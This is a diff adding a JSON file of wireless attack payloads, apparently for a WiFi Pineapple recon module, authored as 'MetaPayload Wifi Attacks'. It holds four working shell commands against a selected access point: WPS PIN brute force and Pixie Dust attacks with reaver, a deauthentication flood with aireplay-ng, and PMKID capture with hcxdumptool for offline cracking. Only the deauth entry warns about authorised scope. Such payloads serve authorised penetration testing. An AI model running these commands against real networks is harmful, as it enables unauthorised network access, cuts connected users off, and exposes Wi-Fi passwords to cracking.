@@ -1,0 +1,62 @@
+{
+  "payloads": [
+    {
+      "name": "MP-WPS Brute Force (Reaver)",
+      "path": "recon/access_point/MP_Reaver",
+      "command": "trap PINEAPPLE_EXAMINE_RESET EXIT INT TERM; PINEAPPLE_EXAMINE_CHANNEL $_RECON_SELECTED_AP_CHANNEL && timeout -k 10s ${TIMEOUT_HOURS}h reaver -i wlan1mon -b $_RECON_SELECTED_AP_BSSID -c $_RECON_SELECTED_AP_CHANNEL -vv $ADDITIONAL_OPTIONS",
+      "required_vars": [],
+      "optional_vars": {
+        "ADDITIONAL_OPTIONS": "",
+        "TIMEOUT_HOURS": "2"
+      },
+      "required_packages": [
+        "reaver"
+      ],
+      "description": "Brute force WPS PIN attack on the selected AP. Long running time depending on AP's WPS lockout policy.",
+      "author": "MetaPayload Wifi Attacks"
+    },
+    {
+      "name": "MP-WPS Pixie Dust (Reaver)",
+      "path": "recon/access_point/MP_Reaver_Pixie_Dust",
+      "command": "trap PINEAPPLE_EXAMINE_RESET EXIT INT TERM; PINEAPPLE_EXAMINE_CHANNEL $_RECON_SELECTED_AP_CHANNEL && timeout -k 10s ${TIMEOUT_MINS}m reaver -i wlan1mon -b $_RECON_SELECTED_AP_BSSID -c $_RECON_SELECTED_AP_CHANNEL -K -vv $ADDITIONAL_OPTIONS",
+      "required_vars": [],
+      "optional_vars": {
+        "ADDITIONAL_OPTIONS": "",
+        "TIMEOUT_MINS": "5"
+      },
+      "required_packages": [
+        "reaver"
+      ],
+      "description": "WPS Pixie Dust attack on the selected AP. Much faster than brute force if the AP is vulnerable.",
+      "author": "MetaPayload Wifi Attacks"
+    },
+    {
+      "name": "MP-AP Deauth (aireplay-ng)",
+      "path": "recon/access_point/MP_aircrack-ng-deauth",
+      "command": "PINEAPPLE_EXAMINE_CHANNEL $_RECON_SELECTED_AP_CHANNEL 60 && timeout -k 10s 60s aireplay-ng -0 $PACKETS -a $_RECON_SELECTED_AP_BSSID wlan1mon --ignore-negative-one",
+      "required_vars": [],
+      "optional_vars": {
+        "PACKETS": "10"
+      },
+      "required_packages": [
+        "aircrack-ng"
+      ],
+      "description": "Deauthentication attack on all clients on selected AP. \n[WARNING!] Ensure the AP is within your authorized scope! Are you sure you want to continue?",
+      "author": "MetaPayload Wifi Attacks"
+    },
+    {
+      "name": "MP-PMKID Capture (hcxdumptool)",
+      "path": "recon/access_point/MP_PMKID_Capture",
+      "command": "trap PINEAPPLE_EXAMINE_RESET EXIT INT TERM;[ $_RECON_SELECTED_AP_CHANNEL -le 14 ] 2>/dev/null && BAND=a || BAND=b;PINEAPPLE_EXAMINE_BSSID $_RECON_SELECTED_AP_BSSID $((TIMEOUT_SECS+60));echo 'wlan addr1 ${_RECON_SELECTED_AP_BSSID//:/} or wlan addr2 ${_RECON_SELECTED_AP_BSSID//:/} or wlan addr3 ${_RECON_SELECTED_AP_BSSID//:/}' > /tmp/filter.txt;tcpdump -s 1024 -y IEEE802_11_RADIO -F /tmp/filter.txt -dd > /tmp/bpfc.txt;hcxdumptool -i wlan1mon --bpf /tmp/bpfc.txt -c ${_RECON_SELECTED_AP_CHANNEL}${BAND} -w /tmp/tmp.pcapng --tot $TIMEOUT_SECS > /tmp/hcxdumptool_log.txt 2>&1",
+      "required_vars": [],
+      "optional_vars": {
+        "TIMEOUT_SECS": "120"
+      },
+      "required_packages": [
+        "hcxdumptool"
+      ],
+      "description": "Capture PMKID from the selected AP for offline cracking. Catches PKMID and handshakes via standard PineAP captures. Get the HashMaster 22000 payload for smart alerts!",
+      "author": "MetaPayload Wifi Attacks"
+    }
+  ]
+}
